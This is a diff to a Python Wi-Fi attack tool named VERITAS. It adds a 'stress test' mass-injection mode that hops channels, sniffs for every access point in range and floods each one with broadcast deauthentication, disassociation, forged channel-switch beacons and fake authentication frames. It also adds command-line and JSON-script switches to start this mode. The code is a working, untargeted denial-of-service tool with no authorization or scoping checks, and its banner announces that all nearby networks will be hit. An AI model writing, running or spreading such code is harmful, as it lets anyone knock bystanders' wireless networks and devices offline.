@@ -1757,6 +1757,202 @@ def pre_flight():
 #               MAIN
 # ============================================================
 
+def run_stress_mode(iface: str, scan_5ghz: bool = False, mode: AttackMode = AttackMode.MEDIUM, vectors: List[AttackVector] = None, duration: int = 0) -> None:
+    """Stress Test / Mass Injection Mode (mdk4-style) for Python."""
+    if vectors is None:
+        vectors = [
+            AttackVector.DEAUTH_FLOOD,
+            AttackVector.DISASSOC_FLOOD,
+            AttackVector.CSA_BEACON,
+            AttackVector.AUTH_DOS,
+        ]
+    
+    print(f"\n  {C.RED}{B}╔═══════════════════════════════════════════════╗{R}")
+    print(f"  {C.RED}{B}║  STRESS TEST — MASS INJECTION ACTIVE          ║{R}")
+    print(f"  {C.RED}{B}║  All Wi-Fi signals in range will be targeted  ║{R}")
+    print(f"  {C.RED}{B}╚═══════════════════════════════════════════════╝{R}\n")
+    print(f"  {C.GRAY}Interface:{R} {C.CYAN}{iface}{R}")
+    print(f"  {C.GRAY}Mode:     {R} {C.RED}{mode.name}{R}")
+    print(f"  {C.GRAY}Band:     {R} {C.ICE}{'2.4GHz + 5GHz' if scan_5ghz else '2.4GHz only'}{R}")
+    print(f"  {C.GRAY}Vectors:  {R} {C.AQUA}{len(vectors)} active{R}\n")
+    
+    ch_24 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
+    ch_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165]
+    channels = ch_24 + (ch_5 if scan_5ghz else [])
+    
+    dwell_map = {
+        AttackMode.STEALTH: 0.5,
+        AttackMode.LOW: 0.35,
+        AttackMode.MEDIUM: 0.20,
+        AttackMode.HIGH: 0.10,
+        AttackMode.INSANE: 0.05,
+    }
+    dwell = dwell_map.get(mode, 0.2)
+    
+    ap_pool = {}  # bssid -> {bssid, ssid, channel, tx_count, last_seen}
+    pool_lock = threading.Lock()
+    current_channel = [1]
+    
+    state.start_time = time.time()
+    state.stop_event.clear()
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    def hopper_loop():
+        idx = 0
+        while not state.stop_event.is_set():
+            ch = channels[idx % len(channels)]
+            current_channel[0] = ch
+            subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True)
+            idx += 1
+            time.sleep(dwell)
+            
+    def sniffer_loop():
+        rt = RadioTapEngine.make_radiotap()
+        def prn(pkt):
+            if state.stop_event.is_set():
+                return
+            if pkt.haslayer(Dot11Beacon):
+                bssid = pkt[Dot11].addr2
+                if not bssid or bssid.startswith("01:"):
+                    return
+                ssid = ""
+                ch = current_channel[0]
+                elt = pkt.getlayer(Dot11Elt)
+                while elt:
+                    if elt.ID == 0 and elt.info:
+                        try:
+                            ssid = elt.info.decode('utf-8', errors='ignore')
+                        except Exception:
+                            ssid = ""
+                    elif elt.ID == 3 and elt.info:
+                        ch = int(elt.info[0])
+                    elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None
+                
+                with pool_lock:
+                    if bssid not in ap_pool and len(ap_pool) < 128:
+                        ap_pool[bssid] = {"bssid": bssid, "ssid": ssid, "channel": ch, "tx_count": 0, "last_seen": time.time()}
+                    elif bssid in ap_pool:
+                        ap_pool[bssid]["last_seen"] = time.time()
+                        ap_pool[bssid]["channel"] = ch
+                        if ssid and not ap_pool[bssid]["ssid"]:
+                            ap_pool[bssid]["ssid"] = ssid
+
+        try:
+            sniff(iface=iface, prn=prn, store=False, stop_filter=lambda _: state.stop_event.is_set())
+        except Exception:
+            pass
+
+    def injector_loop():
+        rt = RadioTapEngine.make_radiotap()
+        seq = 0
+        while not state.stop_event.is_set():
+            with pool_lock:
+                aps = list(ap_pool.values())
+            if not aps:
+                time.sleep(0.3)
+                continue
+            
+            cur_ch = current_channel[0]
+            for ap in aps:
+                if state.stop_event.is_set():
+                    break
+                if ap["channel"] != cur_ch:
+                    continue
+                
+                bssid = ap["bssid"]
+                ssid = ap["ssid"] or "Unknown"
+                sent_cnt = 0
+                
+                pkts_to_send = []
+                if AttackVector.DEAUTH_FLOOD in vectors:
+                    pkts_to_send.append(RadioTapEngine.make_deauth(rt, bssid, "ff:ff:ff:ff:ff:ff"))
+                if AttackVector.DISASSOC_FLOOD in vectors:
+                    pkts_to_send.append(RadioTapEngine.make_disassoc(rt, bssid, "ff:ff:ff:ff:ff:ff"))
+                if AttackVector.CSA_BEACON in vectors:
+                    redir = cur_ch + 3 if cur_ch < 10 else cur_ch - 3
+                    pkts_to_send.append(RadioTapEngine.make_beacon(rt, bssid, ssid, redir if redir > 0 else 11))
+                if AttackVector.AUTH_DOS in vectors:
+                    fake_mac = ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
+                    pkts_to_send.append(RadioTapEngine.make_auth_frame(rt, bssid, fake_mac))
+                
+                for p in pkts_to_send:
+                    try:
+                        sendp(p, iface=iface, verbose=False, monitor=True)
+                        state.pkts_sent += 1
+                        sent_cnt += 1
+                    except Exception:
+                        state.pkts_fail += 1
+                
+                with pool_lock:
+                    if bssid in ap_pool:
+                        ap_pool[bssid]["tx_count"] += sent_cnt
+                
+                time.sleep(0.01)
+            time.sleep(0.05)
+
+    def display_loop():
+        os.system('clear')
+        sys.stdout.write("\033[?25l")
+        sys.stdout.flush()
+        while not state.stop_event.is_set():
+            elapsed = max(0.1, time.time() - state.start_time)
+            h, m, s = int(elapsed // 3600), int((elapsed % 3600) // 60), int(elapsed % 60)
+            pps = state.pkts_sent / elapsed
+            
+            with pool_lock:
+                aps = list(ap_pool.values())
+            
+            sys.stdout.write("\033[H")
+            sys.stdout.write(f"  {C.DEEP_B}╔{'═'*58}╗{R}\n")
+            sys.stdout.write(f"  ║{C.RED}{B}   VERITAS — STRESS TEST (MASS INJECTION)               {R}{C.DEEP_B}║{R}\n")
+            sys.stdout.write(f"  {C.DEEP_B}╠{'═'*58}╣{R}\n")
+            sys.stdout.write(f"  ║ {C.GRAY}IF  {R}{C.CYAN}{iface:<20}{R}  {C.GRAY}MODE {R}{C.RED}{mode.name:<18}{R}║\033[K\n")
+            sys.stdout.write(f"  ║ {C.GRAY}APs {R}{C.AQUA}{len(aps):<4}{R} discovered        {C.GRAY}CH {R}{C.YELLOW}{current_channel[0]:<3}{R} / {C.ICE}{len(channels)}{R}          ║\033[K\n")
+            sys.stdout.write(f"  ║ {C.GRAY}TX  {R}{C.AQUA}{state.pkts_sent:<12}{R}  {C.GRAY}FAIL {R}{C.RED if state.pkts_fail > 0 else C.GRAY}{state.pkts_fail:<6}{R}  {C.GRAY}RATE {R}{C.ICE}{pps:.1f} pps{R}       ║\033[K\n")
+            sys.stdout.write(f"  ║ {C.GRAY}TIME{R} {C.CYAN}{h:02d}:{m:02d}:{s:02d}{R}                                             ║\033[K\n")
+            sys.stdout.write(f"  {C.DEEP_B}╠{'═'*58}╣{R}\n")
+            sys.stdout.write(f"  ║ {C.GRAY}  CH  BSSID              SSID              TX            {R}║\033[K\n")
+            sys.stdout.write(f"  {C.DEEP_B}╠{'═'*58}╣{R}\n")
+            
+            aps_sorted = sorted(aps, key=lambda x: x["channel"])
+            for ap in aps_sorted[:15]:
+                ssid_disp = (ap["ssid"][:18] if ap["ssid"] else "<hidden>")
+                ch_color = C.GREEN if ap["channel"] == current_channel[0] else C.GRAY
+                sys.stdout.write(f"  ║ {ch_color}{ap['channel']:>3}{R}  {ap['bssid']:<18} {ssid_disp:<18} {ap['tx_count']:<10}    ║\033[K\n")
+            
+            sys.stdout.write(f"  {C.DEEP_B}╚{'═'*58}╝{R}\n")
+            sys.stdout.write(f"  {C.DIM_GRAY}[{C.RED}Ctrl+C{R}{C.DIM_GRAY}]{R} stop   {C.GRAY}APs:{R}{C.AQUA}{len(aps)}{R}  {C.GRAY}TX:{R}{C.AQUA}{state.pkts_sent}{R}\n")
+            sys.stdout.flush()
+            time.sleep(0.2)
+        sys.stdout.write("\033[?25h\n")
+        sys.stdout.flush()
+
+    t_hop = threading.Thread(target=hopper_loop, daemon=True)
+    t_sniff = threading.Thread(target=sniffer_loop, daemon=True)
+    t_inj = threading.Thread(target=injector_loop, daemon=True)
+    t_disp = threading.Thread(target=display_loop, daemon=True)
+    
+    t_hop.start()
+    t_sniff.start()
+    t_inj.start()
+    t_disp.start()
+    
+    try:
+        if duration > 0:
+            end_time = time.time() + duration
+            while not state.stop_event.is_set() and time.time() < end_time:
+                time.sleep(1)
+            state.stop_event.set()
+        else:
+            while not state.stop_event.is_set():
+                time.sleep(1)
+    except KeyboardInterrupt:
+        state.stop_event.set()
+    finally:
+        subprocess.run(["iw", "dev", iface, "set", "channel", "1"], capture_output=True)
+        print(f"\n  {C.AQUA}[✓] Stress test complete. Total TX: {state.pkts_sent}{R}\n")
+
+
 def run_script_mode(script_path: str) -> None:
     try:
         with open(script_path, 'r') as f:
@@ -1769,6 +1965,16 @@ def run_script_mode(script_path: str) -> None:
     if not iface:
         print(f"{C.RED}[!] 'interface' required in script JSON{R}")
         sys.exit(1)
+    
+    if cfg.get("stress_mode", False):
+        scan_5ghz = cfg.get("scan_5ghz", False)
+        duration = cfg.get("duration", 0)
+        mode_map = {m.name: m for m in AttackMode}
+        mode = mode_map.get(cfg.get("mode", "MEDIUM").upper(), AttackMode.MEDIUM)
+        vector_map = {v.value: v for v in AttackVector}
+        vectors = [vector_map[n] for n in cfg.get("vectors", []) if n in vector_map]
+        run_stress_mode(iface, scan_5ghz=scan_5ghz, mode=mode, vectors=vectors or None, duration=duration)
+        return
     
     target = TargetAP(
         bssid=cfg.get("target_bssid", ""),
@@ -1853,11 +2059,31 @@ def main():
         print(f"{C.RED}[!] Scapy not installed. Install: pip3 install scapy{R}")
         sys.exit(1)
     
+    if len(sys.argv) >= 2 and (sys.argv[1] == '--help' or sys.argv[1] == '-h'):
+        print(BANNER)
+        print("Usage:")
+        print("  sudo python3 veritas.py                     Interactive mode")
+        print("  sudo python3 veritas.py --stress            Stress test mode (mass injection)")
+        print("  sudo python3 veritas.py --script <json>     Script/automated mode")
+        print("  sudo python3 veritas.py --help              Show this help\n")
+        sys.exit(0)
+        
     if len(sys.argv) >= 3 and sys.argv[1] == '--script':
         os.system('clear')
         print(BANNER)
         pre_flight()
         run_script_mode(sys.argv[2])
+        return
+
+    stress_mode = '--stress' in sys.argv
+    scan_5ghz = '--5ghz' in sys.argv
+    
+    if stress_mode:
+        os.system('clear')
+        print(BANNER)
+        pre_flight()
+        iface = select_interface()
+        run_stress_mode(iface, scan_5ghz=scan_5ghz)
         return
     
     os.system('clear')
